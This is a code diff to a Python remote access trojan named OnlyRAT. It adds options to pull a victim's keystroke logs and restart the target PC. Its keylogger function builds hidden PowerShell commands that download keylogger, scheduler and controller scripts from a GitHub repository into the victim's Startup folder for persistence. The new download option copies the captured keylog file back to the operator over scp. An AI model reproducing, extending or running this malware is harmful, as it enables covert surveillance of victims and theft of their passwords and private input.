@@ -37,13 +37,19 @@ options_menu = """
         [+] Payloads:
             [0] - Remote Console
             [1] - Keylogger
+            [2] - Grab Keylogs
+            [3] - Restart Target PC
 
         [+] Options:
             [h] or [help]    -- Help Menu
+            [c] or [config]  -- Display RAT File
             [v] or [version] -- Version Number
             [u] or [update]  -- Update OnlyRAT
             [r] or [remove]  -- Remove OnlyRAT
             [q] or [quit]    -- Quit
+
+            * any other commands will be 
+              sent through your terminal
 
         [*] Select an [option]...
 
@@ -82,6 +88,12 @@ def read_config(config_file):
 
     return configuration
 
+# display configuration file data
+def print_config(configuration):
+
+    for key, value in configuration.items():
+        print(f"{key} : {value}")
+
 # clear screen
 def clear():
     os.system("clear")
@@ -93,18 +105,32 @@ def exit():
 
 # connects rat to target
 def connect(address, password):
+    print("\n [*] Connecting to target...")
+
     # remotely connect
     os.system(f"sshpass -p \"{password}\" ssh onlyrat@{address}")
 
+
 # remote uploads with SCP
 def remote_upload(address, password, upload, path):
+
+    print("\n[*] Starting Upload...")
+
     # scp upload
     os.system(f"sshpass -p \"{password}\" scp {upload} onlyrat@{address}:{path}")
 
+    print("[+] Upload complete\n")
+
+
 # remote download with SCP
-def remote_download(address, password, download, path):
+def remote_download(address, password, path):
+
+    print("\n[*] Starting Download...")
+
     # scp download
-    os.system(f"sshpass -p \"{password}\" scp -r onlyrat@{address}:{path} {local_path}")
+    os.system(f"sshpass -p \"{password}\" scp -r onlyrat@{address}:{path} ~/Downloads")
+
+    print("[+] Download complete\n")
 
 # run commands remotely with SCP
 def remote_command(address, password, command):
@@ -114,26 +140,24 @@ def remote_command(address, password, command):
 # keylogger
 def keylogger(address, password, username, working):
 
-    print("\n[*] Prepping Keylogger...")
+    print("\n[*] Prepping keylogger...")
     # web requests
     keylogger_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/keylogger.ps1 -OutFile {working}/KHRgMHYmdT.ps1\""
     schedule_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/schedule.ps1 -OutFile {working}/SSvmVmkWmv.ps1\""
     controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/controller.cmd -OutFile GiLqXiexKP.cmd"
-    execute_keylogger = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && powershell powershell.exe -windowstyle hidden ./GiLqXiexKP.cmd"
-    print("[+] Keylogger Prepped")
+    print("[+] Keylogger prepped")
 
-    # remote command execution
-    print("[*] Installing Keylogger...")
+    # installing keylogger
+    print("[*] Installing keylogger...")
     remote_command(address, password, keylogger_command)
-    print("[*] Installing Schedueler...")
+    print("[*] Installing schedueler...")
     remote_command(address, password, schedule_command)
-    print("[*] Installing Controller...")
+    print("[*] Installing controller...")
     remote_command(address, password, controller_command)
-    print("[+] Keylogger Installed Sucessfully\n")
+    print("[+] Keylogger installed sucessfully\n")
 
     # execute logger
-    print("\n[*] Executing Keylogger...")
-    remote_command(address, password, execute_keylogger)
+    print("\n[!] Restart target computer to execute")
 
 # update OnlyRAT
 def update():
@@ -230,9 +254,22 @@ def cli(arguments):
             elif option == "1":
                 keylogger(ipv4, password, target_username, working_direcory)
             
+            # grab keylogs option
+            elif option == "2":
+                remote_download(ipv4, password, f"{working_direcory}/{username}.log")
+
+            # restart target option
+            elif option == "3":
+                remote_command(ipv4, password, "shutdown /r")
+
             # help me
             elif option == "h" or option == "help":
                 main()
+
+            # display config file info
+            elif option == "c" or option == "config":
+                print_config(configuration)
+                print(f"USERNAME : {username}")
             
             # get version number
             elif option == "v" or option == "version":
@@ -250,7 +287,6 @@ def cli(arguments):
             # quit option
             elif option == "q" or option == "quit" or option == "exit":
                 exit()
-
 
             # exception
             else:
